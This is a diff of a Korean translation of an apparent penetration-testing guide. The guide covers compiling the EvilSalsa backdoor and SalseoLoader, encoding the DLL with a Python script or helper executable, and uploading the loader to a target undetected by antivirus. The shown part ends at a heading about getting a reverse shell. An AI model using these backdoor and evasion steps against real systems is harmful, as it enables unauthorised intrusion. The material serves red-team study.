@@ -4,23 +4,23 @@
 
 ## 바이너리 컴파일
 
-소스 코드를 github에서 다운로드하고 **EvilSalsa**와 **SalseoLoader**를 컴파일하세요. 코드를 컴파일하려면 **Visual Studio**가 설치되어 있어야 합니다.
+github에서 소스 코드를 다운로드하고 **EvilSalsa**와 **SalseoLoader**를 컴파일합니다. 코드를 컴파일하려면 **Visual Studio**가 설치되어 있어야 합니다.
 
-사용할 윈도우 박스의 아키텍처에 맞게 프로젝트를 컴파일하세요(Windows가 x64를 지원하면 해당 아키텍처로 컴파일하세요).
+사용할 Windows 박스의 아키텍처에 맞게 프로젝트를 컴파일합니다(Windows가 x64를 지원하면 해당 아키텍처로 컴파일합니다).
 
 **Visual Studio**의 **왼쪽 "Build" 탭**에서 **"Platform Target"**을 통해 **아키텍처를 선택**할 수 있습니다.
 
-(\*\*이 옵션을 찾을 수 없다면 **"Project Tab"**을 클릭한 후 **"\<Project Name> Properties"**를 클릭하세요)
+(**이 옵션을 찾을 수 없으면 **"Project Tab"**을 클릭한 다음 **"\<Project Name> Properties"**를 클릭하세요.)
 
 ![](<../images/image (132).png>)
 
-그런 다음 두 프로젝트를 빌드하세요 (Build -> Build Solution) (로그 안에 실행 파일의 경로가 나타납니다):
+그런 다음 두 프로젝트를 빌드합니다 (Build -> Build Solution) (로그 안에 실행 파일의 경로가 나타납니다):
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
 ## 백도어 준비
 
-우선, **EvilSalsa.dll**을 인코딩해야 합니다. 이를 위해 **encrypterassembly.py**라는 파이썬 스크립트를 사용하거나 **EncrypterAssembly** 프로젝트를 컴파일할 수 있습니다.
+우선, **EvilSalsa.dll**을 인코딩해야 합니다. 이를 위해 python 스크립트 **encrypterassembly.py**를 사용하거나 **EncrypterAssembly** 프로젝트를 컴파일할 수 있습니다.
 
 ### **Python**
 ```
@@ -32,11 +32,11 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-이제 모든 Salseo 작업을 실행하는 데 필요한 것이 있습니다: **인코딩된 EvilDalsa.dll**과 **SalseoLoader의 바이너리.**
+이제 Salseo 작업을 실행하는 데 필요한 모든 것이 있습니다: **인코딩된 EvilDalsa.dll**과 **SalseoLoader의 바이너리.**
 
 **SalseoLoader.exe 바이너리를 머신에 업로드하세요. 어떤 AV에도 탐지되지 않아야 합니다...**
 
-## **백도어 실행**
+## **백도어 실행하기**
 
 ### **TCP 리버스 셸 얻기 (HTTP를 통해 인코딩된 dll 다운로드)**
 
